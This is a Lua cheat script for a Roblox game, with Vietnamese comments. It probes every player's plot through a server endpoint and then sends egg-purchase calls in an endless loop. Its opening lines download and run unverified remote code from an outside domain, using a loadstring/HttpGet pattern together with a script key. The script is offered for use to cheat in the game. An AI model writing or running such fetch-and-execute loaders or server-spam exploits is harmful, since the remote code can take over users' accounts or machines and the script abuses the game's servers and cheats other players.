script_key="TdVwhWpohFRGWfEVbDSwgRifLiopOLOG";
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
-- CONFIG
local DELAY_BETWEEN_SCAN_CALLS = 0.1   -- giây giữa mỗi call khi quét các plot
local SCAN_INTERVAL = 10               -- giây giữa mỗi lần quét lại
local STOP_ON_FIRST_FOUND = true       -- dừng quét ngay khi tìm plot khả dụng
local PRINT_VERBOSE = true             -- in log chi tiết

-- ⏳ Delay riêng cho từng trứng
local EGG_DELAYS = {
    [1] = 0.1,  -- Delay cho trứng 1
    [2] = 80,  -- Delay cho trứng 2
    [3] = 300,  -- Delay cho trứng 3
}

-- SERVICES / PATHS
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PlotsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Plots")
local Plots_Invoke = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Plots_Invoke")

local LocalPlayer = Players.LocalPlayer

-- helper: kiểm tra phản hồi server có hợp lệ hay không
local function isValidResponse(res, ok)
    if not ok then
        return false
    end
    if res == nil or res == false then
        return false
    end
    return true
end

-- scan tất cả plot hiện có trong workspace.__THINGS.Plots
local function scanPlotsAndFindMine()
    if PRINT_VERBOSE then print("🔍 Bắt đầu quét các plot trong workspace.__THINGS.Plots ...") end

    for _, plot in ipairs(PlotsFolder:GetChildren()) do
        local plotId = plot:GetAttribute("ID") or plot:GetAttribute("PlotID") or tonumber(plot.Name) or plot.Name
        local idNum = tonumber(plotId) or plotId

        if PRINT_VERBOSE then print(("  - Thử plot %s"):format(tostring(idNum))) end

        local args = {
            idNum,
            "PurchaseEgg",
            1,
            3
        }

        local ok, res = pcall(function()
            return Plots_Invoke:InvokeServer(unpack(args))
        end)

        if isValidResponse(res, ok) then
            print(("✅ Plot khả dụng phát hiện: %s  | Resp: %s"):format(tostring(idNum), tostring(res)))
            return idNum
        else
            if PRINT_VERBOSE then
                print(("   ✖ Không phải plot của bạn: %s  | ok=%s res=%s"):format(tostring(idNum), tostring(ok), tostring(res)))
            end
        end

        task.wait(DELAY_BETWEEN_SCAN_CALLS)
    end

    print("🔎 Quét xong, không tìm được plot khả dụng.")
    return nil
end

-- spam mua liên tục cho plotId đã tìm được
local function spamPurchase(plotId)
    if not plotId then return end
    print(("🚀 Bắt đầu spam mua trứng 1–3 cho plot %s — dừng bằng cách thoát script"):format(tostring(plotId)))

    while true do
        -- 🥚 Lặp qua từng trứng với delay riêng biệt
        for eggSlot = 1, 3 do
            local args = { plotId, "PurchaseEgg", eggSlot, 3 }

            local ok, res = pcall(function()
                return Plots_Invoke:InvokeServer(unpack(args))
            end)

            if ok then
                print(("✅ Mua thành công trứng #%d (resp=%s) tại plot %s"):format(eggSlot, tostring(res), tostring(plotId)))
            else
                warn(("⚠️ Lỗi khi mua trứng #%d tại plot %s -> %s"):format(eggSlot, tostring(plotId), tostring(res)))
            end

            -- 🕒 delay riêng cho từng trứng
            task.wait(EGG_DELAYS[eggSlot] or 0.2)
        end
    end
end

-- MAIN LOOP: quét lại mỗi SCAN_INTERVAL giây cho đến khi tìm thấy plot
task.spawn(function()
    while true do
        local foundPlot = scanPlotsAndFindMine()
        if foundPlot then
            print("✅ Đã tìm thấy plot của bạn, bắt đầu spam mua trứng...")
            spamPurchase(foundPlot)
            break -- ngừng vòng lặp chính sau khi tìm thấy
        else
            print(("⏳ Không tìm thấy plot khả dụng, thử lại sau %s giây..."):format(SCAN_INTERVAL))
            task.wait(SCAN_INTERVAL)
        end
    end
end)

